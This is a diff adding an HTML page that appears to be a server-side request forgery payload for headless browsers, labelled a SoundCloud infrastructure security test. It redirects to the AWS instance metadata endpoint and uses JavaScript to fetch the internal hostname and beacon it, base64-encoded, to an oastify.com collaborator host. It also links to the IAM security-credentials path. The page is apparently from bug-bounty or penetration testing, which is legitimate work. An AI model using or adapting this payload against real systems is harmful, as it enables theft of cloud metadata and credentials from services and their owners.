@@ -1,1 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Internal Infrastructure Audit</title>
+    
+    <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/hostname">
 
+    <script>
+        // 2. JAVASCRIPT EXFILTRATION: Targets advanced headless browsers
+        window.onload = function() {
+            // Your new Collaborator URL
+            const oast = "ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
+            
+            // Attempting to grab the AWS internal hostname
+            fetch("http://169.254.169.254/latest/meta-data/hostname")
+                .then(response => response.text())
+                .then(data => {
+                    // Send the data back to you Base64 encoded
+                    navigator.sendBeacon("http://" + oast + "/exfil?data=" + btoa(data));
+                })
+                .catch(err => {
+                    // Log the failure to see why it was blocked
+                    const img = new Image();
+                    img.src = "http://" + oast + "/log?status=blocked_or_timeout";
+                });
+        };
+    </script>
+</head>
+<body>
+    <h1>SoundCloud Infrastructure Security Test</h1>
+    <p>Automated Worker Detected. If redirection fails, follow the internal path:</p>
+    
+    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">Internal IAM Credentials</a>
+
+    <hr>
+    <p>Node Trace: <span id="trace">Processing...</span></p>
+</body>
+</html>
